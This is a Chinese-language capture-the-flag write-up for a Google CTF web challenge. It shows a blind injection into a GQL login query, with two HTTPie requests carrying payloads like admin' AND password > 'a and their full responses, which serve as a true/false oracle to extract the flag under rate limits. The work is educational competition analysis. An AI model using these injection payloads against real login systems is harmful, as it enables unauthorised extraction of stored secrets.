题目每次随机一个 host，而 flag 由 host 算出，很明显是一个 host 对应一个 flag。

程序很短，看完后会发现其实就是每次从数据库中取出 flag 与输入对比，如果对了会返回输入。
很显然，我们即使通过任何方式使得校验通过，走到最后一步，我们也只是拿到我们的输入，而不是 flag。
那么，这题一定不是要想办法绕过验证。
而 flag 是通过 host + 一个 secret hmac 算出，在没有 secret 的情况下，我们显然不可能计算 key。

仔细观察程序，我们会发现，虽然程序使用了 Google APP 特有的数据库，通过 gql 操作，但是还是有着 SQL 类似的语法，
而程序中通过格式化字符串将我们的输入传入了 gql 中，这很明显符合 SQL injection 的特点。
于是测试会发现确实存在 SQLi，只是语法很受限制。

```
➜  (ripples-MBP) ~/workspace/CTF/google-ctf/A7  http -v --form POST http://opsczz72www-abuse.web.ctfcompetition.com/login user="admin' AND password 额的返回会触发 exception= 'a" password=CTF{123}
POST /login HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 60
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Host: opsczz72www-abuse.web.ctfcompetition.com
User-Agent: HTTPie/0.9.9

user=admin%27+AND+password+%3C%3D+%27a&password=CTF%7B123%7D

HTTP/1.1 302 Found
Cache-Control: no-cache
Content-Length: 0
Content-Type: text/html; charset=utf-8
Date: Sun, 18 Jun 2017 17:14:00 GMT
Location: http://opsczz72www-abuse.web.ctfcompetition.com/index.html?e=Wrong%20password
Proxy-Connection: keep-alive
Server: Google Frontend
X-Cloud-Trace-Context: c47917affb36aa4dc6577863a5d79b09



➜  (ripples-MBP) ~/workspace/CTF/google-ctf/A7  http -v --form POST http://opsczz72www-abuse.web.ctfcompetition.com/login user="admin' AND password > 'a" password=CTF{123}
POST /login HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 57
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Host: opsczz72www-abuse.web.ctfcompetition.com
User-Agent: HTTPie/0.9.9

user=admin%27+AND+password+%3E+%27a&password=CTF%7B123%7D

HTTP/1.1 302 Found
Cache-Control: no-cache
Content-Length: 0
Content-Type: text/html; charset=utf-8
Date: Sun, 18 Jun 2017 17:14:29 GMT
Location: http://opsczz72www-abuse.web.ctfcompetition.com/index.html?e=Wrong%20username
Proxy-Connection: keep-alive
Server: Google Frontend
X-Cloud-Trace-Context: aab779873157ec579976f4c103a17aa9
```

通过上面的 payload，我们实现了一个 01 测试，于是只要一位位的二分判断，我们最终能够拿到 flag。

但是，程序中有着大量访问频率的限制，归结起来如下：

1. 30s 内只能访问 13 次
1. 30s 内只能触发 error 2 次
1. 一个 host 只能使用 2240 次

而 flag 有 64 位需要爆破，这意味着平均一位需要在 35s 内猜出，而 wrong password 的返回会触发 error，很显然这样时间很吃紧。

第一个想法当然是是否可以通过一个域名注入猜测其它域名的 flag，但在 gql 中似乎不容易实现。
那么我们就只好进行优化，这似乎也印证了题目为什么要设置成不唯一确定 flag 的形式。
优化其实也很明显，无非就是切分不是无脑二分，同时尽量不要做无谓的等待，尽量重复利用允许的请求次数上限。
由于不确定怎样最快，最后实现了多个版本，改好一个跑起来改改策略同时跑起来，能不能跑出来就看运气了。
